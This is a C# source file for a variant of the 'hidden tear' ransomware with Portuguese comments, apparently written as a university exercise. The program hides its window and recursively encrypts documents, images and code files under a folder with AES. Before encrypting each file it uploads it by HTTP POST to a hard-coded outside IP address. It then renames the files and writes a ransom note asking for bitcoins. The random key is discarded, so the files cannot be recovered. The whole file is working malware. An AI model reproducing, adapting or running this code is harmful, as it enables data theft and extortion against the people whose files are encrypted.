using System;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.IO;
using System.Net.Http;
using System.Net.Http.Headers;

namespace hidden_tear
{
    //Objeto para enviar o arquivo para a API
    public class FileUploadDTO
    {
        public string Nome { get; set; }
        public string Tipo { get; set; }
        public byte[] Arquivo { get; set; }
    }

    public partial class Form1 : Form
    {
        string userName = Environment.UserName; //Pega o usuário do logado
        string computerName = System.Environment.MachineName.ToString(); //Pega o nome do computador
        string userDir = "C:\\Users\\" + Environment.UserName + "\\Desktop\\Faculdade\\"; // Cria a pasta onde serão criptografados os arquivos contidos nela

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Opacity = 0;
            this.ShowInTaskbar = false;

            //Inicia o processo de criptografia
            startAction();

        }

        private void Form_Shown(object sender, EventArgs e)
        {
            Visible = false;
            Opacity = 100;
        }

        public void startAction()
        {
            string password = CreatePassword(15);
            string path = "Ransomware";
            string startPath = userDir + path;
            encryptDirectoryAsync(startPath, password);
            messageCreator();
            password = null;
            Application.Exit();
        }

        //AES algoritmo de criptografia
        public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {
            byte[] encryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }

            return encryptedBytes;
        }

        //Cria uma senha aleatória para ser usada para descriptografar
        public string CreatePassword(int length)
        {
            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
            StringBuilder res = new StringBuilder();
            Random rnd = new Random();
            while (0 < length--)
            {
                res.Append(valid[rnd.Next(valid.Length)]);
            }
            return res.ToString();
        }

        //Criptografa um arquivo
        public void EncryptFile(string file, string password)
        {
            byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

            //Criptografa a senha com SHA256
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);

            File.WriteAllBytes(file, bytesEncrypted);
            System.IO.File.Move(file, file + ".unibh");
        }

        //Valida as extensões dos arquivos e chama o método para criptografar
        public void encryptDirectoryAsync(string location, string password)
        {

            //Extensões para serem criptografadas
            var validExtensions = new[]
            {
                ".txt", ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"
            };

            string[] files = Directory.GetFiles(location);
            string[] childDirectories = Directory.GetDirectories(location);
            for (int i = 0; i < files.Length; i++)
            {

                var auxFile = new FileUploadDTO();

                auxFile.Nome = Path.GetFileName(files[i]);
                auxFile.Tipo = Path.GetExtension(files[i]);

                var bytes = File.ReadAllBytes(files[i]);
                auxFile.Arquivo = bytes;

                //Verifica se o tipo do arquivo tem uma extensão válida
                if (validExtensions.Contains(auxFile.Tipo))
                {
                    Task.Run(async () =>
                    {
                        await UploadAsync(auxFile, files[i], password); //Método para fazer o upload do arquivo para a nuvem
                    }).Wait();

                    //Chama o método para criptografar os arquivos
                    EncryptFile(files[i], password);
                }
            }

            for (int i = 0; i < childDirectories.Length; i++)
            {
                encryptDirectoryAsync(childDirectories[i], password);
            }
        }

        //Cria um arquivo de texto após terminar o processo
        public void messageCreator()
        {
            string path = "Ransomware\\READ_IT.txt";
            string fullpath = userDir + path;
            string[] lines = { "Files has been encrypted with hidden tear", "Send me some bitcoins or kebab", "And I also hate night clubs, desserts, being drunk." };
            System.IO.File.WriteAllLines(fullpath, lines);
        }

        //Chama a API para realizar o upload dos arquivos
        public async Task<HttpResponseMessage> UploadAsync(FileUploadDTO file, string files, string password)
        {
            using (var client = new HttpClient())
            {
                client.BaseAddress = new Uri("http://187.111.18.94:54321");
                client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));

                return await client.PostAsJsonAsync("/CryptAPI/api/EnviarArquivos/Post", file);
            }
        }
    }
}
